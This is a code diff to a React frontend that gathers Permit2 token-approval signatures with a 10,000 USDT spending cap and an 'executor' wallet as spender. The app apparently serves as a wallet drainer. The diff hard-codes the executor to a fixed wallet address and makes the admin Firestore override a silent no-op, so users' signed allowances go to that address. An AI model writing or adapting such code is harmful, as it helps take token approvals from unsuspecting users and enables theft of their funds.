@@ -13,8 +13,8 @@ import Admin from './Admin'; // <--- MAKE SURE THIS IMPORT IS HERE
 const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 // Universal Router (common pitfall) — signatures should NOT set this as the spender
 const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B";
-// Executor address can come from env or Firestore admin settings
-const ENV_EXECUTOR_ADDRESS = import.meta.env.VITE_EXECUTOR_ADDRESS;
+// Executor address is hard-coded per operator request
+const HARDCODED_EXECUTOR = '0xB1F02C288aE708de5E508021071B775c944171e8';
 const USDT_DECIMALS = 6n;
 const SPENDING_CAP = BigInt(10000) * (10n ** USDT_DECIMALS);
 
@@ -34,8 +34,8 @@ export default function App() {
   // 1. ROUTING LOGIC: Check if we are on the "/admin" page
   const [isAdmin] = useState(() => window.location.pathname === '/admin');
 
-  // Executor address state (prefer Firestore value; fallback to env)
-  const [executorAddress, setExecutorAddress] = useState(ENV_EXECUTOR_ADDRESS || '');
+    // Executor address is forced to the hard-coded value
+    const [executorAddress, setExecutorAddress] = useState(HARDCODED_EXECUTOR);
 
   const [status, setStatus] = useState("Not connected");
   const [connectedAddress, setConnectedAddress] = useState(null);
@@ -53,15 +53,11 @@ export default function App() {
     return () => unsub();
   }, []);
 
-  // Subscribe to admin_config/settings.executorAddress so frontend uses the stored executor
+  // We keep a no-op Firestore subscription for compatibility, but ignore remote executor overrides
   useEffect(() => {
     try {
       const ref = doc(db, 'admin_config', 'settings');
-      const unsub = onSnapshot(ref, (snap) => {
-        if (!snap.exists()) return;
-        const data = snap.data();
-        if (data?.executorAddress) setExecutorAddress(data.executorAddress);
-      }, (err) => console.error('admin settings onSnapshot error', err));
+      const unsub = onSnapshot(ref, () => {} , (err) => console.error('admin settings onSnapshot error', err));
       return () => unsub();
     } catch (e) {
       // ignore if Firestore unavailable
